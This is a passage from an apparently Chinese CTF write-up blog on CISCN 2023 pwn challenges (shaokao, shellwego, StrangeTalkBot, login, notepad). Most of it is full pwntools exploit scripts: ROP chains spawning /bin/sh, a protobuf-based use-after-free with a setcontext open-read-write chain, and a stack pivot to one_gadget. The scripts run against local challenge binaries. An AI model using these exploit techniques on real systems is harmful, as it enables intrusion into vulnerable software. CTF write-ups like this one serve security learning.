class="string">&quot;./shaokao&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, <span class="string">b&quot;-100000&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;4&quot;</span>)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *0x401F8D&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret = <span class="number">0x0000000000458827</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x000000000040264f</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000040a67e</span></span><br><span class="line">pop_rdx_rbx_ret = <span class="number">0x00000000004a404b</span></span><br><span class="line">syscall = <span class="number">0x0000000000402404</span></span><br><span class="line">name = <span class="number">0x4E60F0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span>*<span class="number">5</span></span><br><span class="line">payload += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(name)</span><br><span class="line">payload += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx_rbx_ret) + p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(syscall)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="3-shellwego"><a href="#3-shellwego" class="headerlink" title="3. shellwego"></a>3. shellwego</h2><p>一道 go 语言编写的题目，脱去了符号表，十分难分析。参考了好几位大佬的 wp，还是比较难懂（真的不会手撕汇编😭）。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121555457.png" alt="image-20230912155552373" style="zoom:50%;" /><p>因此使用了一个开源 go 语言恢复符号表的项目：<a href="https://github.com/0xjiayu/go_parser">go_parser</a>。<code>alt+f7</code>打开<code>go_parser.py</code>即可恢复大部分符号表：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121600623.png" alt="image-20230912160020250" style="zoom:50%;" /><p>虽说恢复了大部分符号表，但有的部分仍需要结合汇编语言进行分析。go 的主函数是 main_main，是可以反汇编的，但其实很多信息只有在汇编窗口才能看到：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121610813.png" alt="image-20230912161044473" style="zoom:50%;" /><p>结合程序的实际运行情况，我们可以推测出一些函数的大致功能，从 main_main 的运行逻辑来看：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121618148.png" alt="image-20230912161858088" style="zoom:50%;" /><p>接下来进入一个关键函数，同时我们随便输入一串垃圾字符串，程序报出<code>Cert Is A Must</code>错误，说明我们需要认证，我们进入关键函数看看：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121628912.png" alt="image-20230912162823858" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121716719.png" alt="image-20230912171617567" style="zoom:50%;" /><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121719124.png" alt="image-20230912171949924" style="zoom:50%;" /><p>在目标函数中有个 RC4 加密：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121723974.png" alt="image-20230912172355920" style="zoom:50%;" /><p>解密脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#  -*- UTF-8 -*- #</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@filename:rc4_exp.py</span></span><br><span class="line"><span class="string">@author:Anza</span></span><br><span class="line"><span class="string">@time:2023-09-12</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">data, key1</span>):        <span class="comment"># 加密</span></span><br><span class="line">    key = <span class="built_in">bytes</span>(key1, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    res = enc.encrypt(data.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    res=base64.b64encode(res)</span><br><span class="line">    res = <span class="built_in">str</span>(res,<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_decrypt</span>(<span class="params">data, key1</span>):        <span class="comment"># 解密</span></span><br><span class="line">    data = base64.b64decode(data)</span><br><span class="line">    key = <span class="built_in">bytes</span>(key1, encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    enc = ARC4.new(key)</span><br><span class="line">    res = enc.decrypt(data)</span><br><span class="line">    res = <span class="built_in">str</span>(res,<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data = <span class="string">&#x27;JLIX8pbSvYZu/WaG&#x27;</span>  <span class="comment"># 需要解密的内容</span></span><br><span class="line">    key = <span class="string">&#x27;F1nallB1rd3K3y&#x27;</span>  <span class="comment"># 加密key</span></span><br><span class="line">    <span class="comment"># encrypt_data = rc4_encrypt(data, key)     # 加密方法</span></span><br><span class="line">    <span class="comment"># print(&#x27;加密后:&#x27;, encrypt_data)</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;解密后:&#x27;</span>, rc4_decrypt(data, key))         <span class="comment"># 解密方法</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># S33UAga1n@#!</span></span><br></pre></td></tr></table></figure><p>拿到密钥也就是第三个参数<code>S33UAga1n@#!</code>。接下来就可以使用一些命令：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121913251.png" alt="image-20230912191344992" style="zoom:50%;" /><p>漏洞在 echo 命令中：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309121956386.png" alt="image-20230912195652305" style="zoom:50%;" /><p>调试出来的 exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./service&quot;</span>)</span><br><span class="line"></span><br><span class="line">p1 = <span class="string">b&#x27;cert&#x27;</span></span><br><span class="line">p2 = <span class="string">b&#x27;nAcDsMicN&#x27;</span></span><br><span class="line">p3 = <span class="string">b&#x27;S33UAga1n@#!&#x27;</span></span><br><span class="line">payload = p1 + <span class="string">b&quot; &quot;</span> + p2 + <span class="string">b&quot; &quot;</span> + p3</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;ciscnshell$ &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;echo &#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x1f0</span></span><br><span class="line">payload += <span class="string">b&#x27; &#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;+&#x27;</span>*<span class="number">0x33</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x588018</span></span><br><span class="line">pop_rax_ret = <span class="number">0x000000000040d9e6</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000444fec</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x000000000041e818</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x000000000049e11d</span></span><br><span class="line">syscall = <span class="number">0x000000000040328c</span></span><br><span class="line"></span><br><span class="line">chain = p64(pop_rax_ret) + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(binsh) + p64(pop_rdx_ret) + p64(<span class="number">8</span>) + p64(syscall)</span><br><span class="line">chain += p64(pop_rax_ret) + p64(<span class="number">0x3b</span>) + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(pop_rdx_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">payload += chain</span><br><span class="line"><span class="comment"># gdb.attach(io, &quot;b *0x04C180B&quot;)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="comment"># io.send(b&quot;/bin/sh\x00&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;nightingale# &quot;</span>, payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="4-StrangeTalkBot"><a href="#4-StrangeTalkBot" class="headerlink" title="4. StrangeTalkBot"></a>4. StrangeTalkBot</h2><p>一道有关<code>protobuf</code>序列化的题目，仍然记得 2021 年华东南赛区有一道也是关于<code>protobuf</code>的题目，属实是回力镖打回来了。那么是怎么看出来与<code>protobuf</code>有关的呢？审计代码的时候发现如下字符串：</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309122008358.png" alt="image-20230912200802229" style="zoom:50%;" /><p>因此还要学习<code>.proto</code>的编写方法和<code>protoc</code>的使用方法，主要参考了<a href="https://xz.aliyun.com/t/12580#toc-0">Protobuf Pwn学习利用</a>这篇文章。</p><p>需要注意的是对于有 protobuf 标志的程序可以直接使用 pbtk 工具直接提取出 ctf.proto，命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./extractors/from_binary.py [-h] input_file [output_dir]</span></span><br><span class="line">./extractors/from_binary.py ./pwn ./</span><br></pre></td></tr></table></figure><p>而对于没有 protobuf 标志的程序就需要自己手撕 ctf.proto，这道题就是没有标志的情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto2&quot;</span>;</span><br><span class="line"></span><br><span class="line">package ctf;</span><br><span class="line"></span><br><span class="line">message Devicemsg&#123;</span><br><span class="line">    required sint64 actionid = <span class="number">1</span>;</span><br><span class="line">    required sint64 msgidx = <span class="number">2</span>;</span><br><span class="line">    required sint64 msgsize = <span class="number">3</span>;</span><br><span class="line">    required bytes msgcontent = <span class="number">4</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后通过<code>protoc</code>命令生成可供使用的<code>ctf_pb2</code>文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protoc -I=./ --python_out=./ ctf.proto</span><br></pre></td></tr></table></figure><p>题目实际上只是个 libc2.31 下的 UAF，开了沙箱禁了 execve，找 rdi 转 rdx 的 gadget 打 setcontext+61 即可，关于如何找到<code>rdi2rdx</code>的 gadget，可用如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">anza@anza-virtual-machine:~/Desktop/pwn/ciscn2023_pri/strangetalkbot$ ROPgadget --binary libc-2.31.so --only <span class="string">&quot;call&quot;</span> | grep rdx</span><br><span class="line">0x0000000000152dcf : call qword ptr [rdx + 0x10]</span><br><span class="line">0x000000000002409b : call qword ptr [rdx + 0x1d0]</span><br><span class="line">0x0000000000151998 : call qword ptr [rdx + 0x20]</span><br><span class="line">0x000000000012aa04 : call qword ptr [rdx + 0x28]</span><br><span class="line">0x000000000015173d : call qword ptr [rdx - 0x11]</span><br><span class="line">0x000000000002fdd3 : call qword ptr [rdx]</span><br><span class="line">0x0000000000030ea3 : call rdx</span><br></pre></td></tr></table></figure><p>有关 gadget 不算多，一个个在原 libc 中找符合的即可。</p><p> exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from ctf_pb2 import *</span></span><br><span class="line"><span class="keyword">import</span> ctf_pb2</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./service&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    msg = ctf_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">1</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    payload = msg.SerializeToString()</span><br><span class="line">    io.sendafter(<span class="string">b&quot;You can try to have friendly communication with me now: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = ctf_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">4</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload = msg.SerializeToString()</span><br><span class="line">    io.sendafter(<span class="string">b&quot;You can try to have friendly communication with me now: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    msg = ctf_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">3</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = <span class="number">0</span></span><br><span class="line">    msg.msgcontent = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    payload = msg.SerializeToString()</span><br><span class="line">    io.sendafter(<span class="string">b&quot;You can try to have friendly communication with me now: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    msg = ctf_pb2.Devicemsg()</span><br><span class="line">    msg.actionid = <span class="number">2</span></span><br><span class="line">    msg.msgidx = idx</span><br><span class="line">    msg.msgsize = size</span><br><span class="line">    msg.msgcontent = content</span><br><span class="line">    payload = msg.SerializeToString()</span><br><span class="line">    io.sendafter(<span class="string">b&quot;You can try to have friendly communication with me now: \n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="built_in">str</span>(i).encode()*<span class="number">0x80</span>) <span class="comment">#0-6</span></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x80</span>, <span class="string">b&#x27;8&#x27;</span>*<span class="number">0x80</span>)  <span class="comment">#7</span></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x80</span>, <span class="string">b&#x27;9&#x27;</span>*<span class="number">0x80</span>)  <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">8</span>)</span><br><span class="line">offset = <span class="number">0x7fd9ced4ebe0</span> - <span class="number">0x7fd9ceb62000</span></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - offset</span><br><span class="line">log.success(<span class="string">&quot;libc_base == &gt;&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recv(<span class="number">8</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x10</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base == &gt;&quot;</span> + <span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">setcontext = libc_base + libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">61</span></span><br><span class="line">magic = libc_base + <span class="number">0x151990</span></span><br><span class="line">ret = libc_base + <span class="number">0x0000000000022679</span></span><br><span class="line">edit(<span class="number">6</span>, <span class="number">8</span>, p64(free_hook))</span><br><span class="line"></span><br><span class="line">heap12 = heap_base + <span class="number">0x13c0</span> + <span class="number">0x10</span></span><br><span class="line">heap13 = heap_base + <span class="number">0x1600</span> + <span class="number">0x20</span></span><br><span class="line">magic_payload = <span class="string">b&#x27;z&#x27;</span>*<span class="number">8</span> + p64(heap12) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(setcontext)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x80</span>, magic_payload)   <span class="comment">#9</span></span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x80</span>, p64(magic))   <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(setcontext)</span><br><span class="line">payload = payload.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;t&#x27;</span>) + p64(heap13) + p64(ret)</span><br><span class="line">payload = payload.ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;t&#x27;</span>)</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0xf0</span>, payload)    <span class="comment">#11</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">open_addr = libc_base + libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">flag_addr = heap12</span><br><span class="line"></span><br><span class="line">orw = p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x20</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_ret) + p64(<span class="number">0x20</span>) + p64(write_addr)</span><br><span class="line">orw = orw.ljust(<span class="number">0xf0</span>, <span class="string">b&#x27;o&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0xf0</span>, orw)    <span class="comment">#12</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *$rebase(0x1542)&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="2023Ciscn华东南赛区"><a href="#2023Ciscn华东南赛区" class="headerlink" title="2023Ciscn华东南赛区"></a>2023Ciscn华东南赛区</h1><p>参考了天虞的 wp：<a href="https://mp.weixin.qq.com/s/fZQkexelGtulEHKtZ2mJwQ">ciscn国赛华东南分区赛PWN方向WriteUp分享</a>。</p><h2 id="1-login"><a href="#1-login" class="headerlink" title="1. login"></a>1. login</h2><p>被出题人气晕。一道看似普通的栈迁移题目。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309060005178.png" alt="image-20230906000536967" style="zoom:50%;" /><p>坑1：泄露 libc 的时候要抬栈。</p><p>坑2：要返回到程序的 call puts 上，返回其他地址不知为何会报错。</p><p>坑3；栈溢出后第二次溢出了 18 个字节，但由于栈不够高，直接打 system(“/bin/sh\x00”)行不通。</p><p>于是乎，找了个贼奇怪的 gadget : mov edx, 0x148fff0，增加溢出长度，然后再构造条件打 one_gadget，调试调得心肌梗要出来了😵。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309060009110.png" alt="image-20230906000934067" style="zoom: 50%;" /><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./login&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004013d3</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x00000000004013d1</span></span><br><span class="line">leave_ret = <span class="number">0x40136E</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">start = <span class="number">0x4010F0</span></span><br><span class="line">main = <span class="number">0x4012CE</span></span><br><span class="line">magic = <span class="number">0x40134E</span></span><br><span class="line">bss = <span class="number">0x404060</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">240</span> + p64(bss) + p64(leave_ret)</span><br><span class="line">io.sendafter(<span class="string">b&quot;Enter your password:\n&quot;</span>, payload1)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0x404800</span>)</span><br><span class="line">payload2 += p64(ret)*<span class="number">12</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;alarm&quot;</span>]) + p64(magic)</span><br><span class="line">gdb.attach(io, <span class="string">&quot;b *0x40136E&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendafter(<span class="string">b&quot;Enter your password:\n&quot;</span>, payload2)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;alarm&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = <span class="number">0x404060</span></span><br><span class="line">one_gadget = libc_base + <span class="number">0xebcf8</span></span><br><span class="line"></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x404080</span>)*<span class="number">13</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(libc_base+<span class="number">0x011c929</span>)+ p64(elf.sym[<span class="string">&quot;read&quot;</span>]))</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="number">0x404080</span>)*<span class="number">13</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span> + p64(ret)*<span class="number">10</span> + p64(pop_rdx_r12_ret) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(pop_rsi_r15_ret) + p64(<span class="number">0</span>)*<span class="number">2</span> + p64(one_gadget))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2-notepad"><a href="#2-notepad" class="headerlink" title="2. notepad"></a>2. notepad</h2><p>这种板子题终于能独自做出来了😭，一道 libc 2.35 的 UAF 漏洞题，bss 上维护了堆指针和堆 size，释放的时候只置零了堆 size，导致了 UAF 漏洞。</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309061637538.png" alt="image-20230906163750321" style="zoom:50%;" /><p>申请堆的次数有 15 次，先通过 